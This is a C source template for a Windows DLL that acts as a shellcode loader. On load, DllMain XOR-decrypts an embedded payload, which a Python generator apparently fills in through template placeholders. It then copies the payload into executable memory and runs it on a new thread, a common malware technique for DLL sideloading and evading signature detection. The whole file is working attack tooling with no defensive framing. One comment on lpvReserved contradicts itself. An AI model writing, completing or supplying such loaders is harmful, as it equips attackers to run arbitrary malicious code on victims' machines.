#include <windows.h>

// Simple XOR decryption stub
void XOR(char *data, size_t data_len, char key) {
    for (size_t i = 0; i < data_len; i++) {
        data[i] = data[i] ^ key;
    }
}

// Shellcode and key are injected by the Python script
unsigned char shellcode[] = { {{ shellcode_hex }} };
char key = {{ xor_key }};

DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {
    // Allocate memory with execute permissions
    LPVOID exec_mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        return 1; // Failed to allocate memory
    }

    // Copy decrypted shellcode to executable memory
    // For RtlMoveMemory, you would include <winternl.h> or just use a loop for simplicity here.
    // Using a loop:
    char* src = (char*)shellcode;
    char* dst = (char*)exec_mem;
    for (size_t i = 0; i < sizeof(shellcode); ++i) {
        dst[i] = src[i];
    }
    // Or use memcpy:
    // memcpy(exec_mem, shellcode, sizeof(shellcode));


    // Create a function pointer to the shellcode
    void (*shellcode_func)() = (void (*)())exec_mem;

    // Execute the shellcode
    shellcode_func();

    // Free the allocated memory (shellcode might exit process, so this might not be reached)
    // VirtualFree(exec_mem, 0, MEM_RELEASE); // Not strictly necessary if shellcode exits/takes over
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    HANDLE hThread = NULL;

    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // A process is loading the DLL.
            // Decrypt the payload first
            XOR((char*)shellcode, sizeof(shellcode), key);

            // Create a new thread to execute the shellcode.
            // This is important because DllMain has restrictions and should return quickly.
            hThread = CreateThread(NULL, 0, ExecuteShellcode, NULL, 0, NULL);
            if (hThread) {
                CloseHandle(hThread); // We don't need to wait for it or manage it further.
            }
            break;

        case DLL_THREAD_ATTACH:
            // A thread is being created in the process.
            break;

        case DLL_THREAD_DETACH:
            // A thread is exiting cleanly.
            break;

        case DLL_PROCESS_DETACH:
            // A process is unloading the DLL.
            // lpvReserved will be NULL if FreeLibrary is called or the process is terminating.
            // lpvReserved will be non-NULL if the process is terminating.
            break;
    }
    return TRUE; // Successful.
}